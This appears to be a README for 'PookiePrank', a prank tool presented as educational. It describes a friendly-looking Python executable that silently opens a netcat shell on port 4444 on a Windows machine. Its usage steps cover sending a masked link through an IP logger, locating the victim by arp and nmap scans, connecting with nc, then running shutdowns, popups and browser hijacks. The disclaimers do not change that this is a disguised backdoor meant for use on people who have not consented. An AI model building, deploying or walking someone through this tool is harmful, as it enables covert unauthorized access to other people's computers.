# PookiePrank: A Cute but Terrifying Cybersecurity Awareness Tool 💀🎀


PLEASE READ THE FULL DOCUMENTATION FOR THE BETTER UNDERSTANDING OF THE PROJECT.
---

## What Is This?

**PookiePrank** is a lightweight "educational" program designed to demonstrate the importance of digital awareness through *strategic chaos*.  
It's a prank tool wrapped in charm — **cute on the outside, spooky on the inside**.

- Uses `netcat` for remote shell access (with full user control)
- Disguised behind a friendly-looking Python CLI
- A educational project that puts a Windows OS to vulnerability (and attacks eventually if not taken care of).
- Perfect for ethical demos, cybersecurity training, and… *light mischief*.

---

## Features

- **Silent Netcat Backdoor:** Triggers a reverse shell silently via batch file.
- **User Distraction UI:** Friendly messages and fake interactions to lower suspicion.
- **Remote Payload Execution:** Once connected, send commands in real-time.
- **Prank Arsenal:** Shutdowns, message popups, browser hijacks, and more.
- **Educational Angle:** Reinforces the dangers of blind trust in random executables.

---

## Why?

Because **security through trauma** works.  
This tool is designed to:

- Raise awareness of how easily social engineering works.
- Show how reverse shells operate.
- Make friends laugh *and* cry.
- Be a conversation starter in any cybersecurity interview.

---

## Usage

1. Host the executable and `netcat` folder.
2. Send the masked download link using a shortened IP logger service.
3. Wait for the target to run the file.
4. Connect to the shell:
- This is the command that triggers the backdoor in our Window machine (Runs automatically on running the Python file).
   ```bash
   nc64 -lvp 4444
   
- The command attacker needs to run in their machines.
  - For Linux
    ```bash
    nc <ip_address_of _the_target_machine> 4444
  
  - For Windows
    ```bash
    nc64 <ip_address_of _the_target_machine> 4444
    
   - For windows users, you can download `netcat` tool from [this repository](https://github.com/int0x33/nc.exe/)
   - In Linux, the netcat comes preinstalled.

   NOTE:
   
   - You will need to know the target ip address beforehand. You can either use IP Loggers or do an `arp` scan over the local network.
   
   - If you are on a virtual machine, perform an arp scan on your host machine..
   
   - For Wondows
     ```bash
     arp -a
   
   - For Linux
     ```bash
     sudo arp-scan --localhost
     
   This will list all the IP addresses in a network and we have to find our target from this which can simply be done by an nmap scan
   
   ```bash
   nmap -p 4444 <ip_address>
   ```
   If we find the port number 4444 open for any IP address, it maybe our target machine. Just try to connect using the netcat command if its successful the we're in the machine.


6. Enjoy responsibly (or face karmic doom).
  ---




---

## Responsible Pranking Guidelines

1. No persistence (no startup or registry hacks).

2. No firewall tampering.

3. No data theft or spying.

4. Always reveal the prank eventually.

5. Use only on friends who won't yeet you into oblivion.



---

## Legal Disclaimer

**This project is for educational and ethical use only.
The creator takes no responsibility for misuse or unforeseen Rickroll (or any) damage caused by the same.**


---

## Future Plans

1. Add GUI launcher with meme themes

2. Auto-cancel prank if user types a secret code

3. PookieSec Dashboard™ for multi-prank coordination

4. Add dancing ASCII Rick in the terminal



## One Last Thing...

> **IMPORTANT:** For this prank to work, **you and your target must be on the same network** (e.g., college Wi-Fi, LAN party, cursed hostel internet).  
> Netcat operates over **local IP addresses** unless you're routing through public ports with port forwarding — which we’re *not doing here* (because jail is not part of the prank).

So yeah — **same Wi-Fi = RickRoll access granted**.

Stay stealthy, stay sassy.

— *PookieSec Ops Out.*
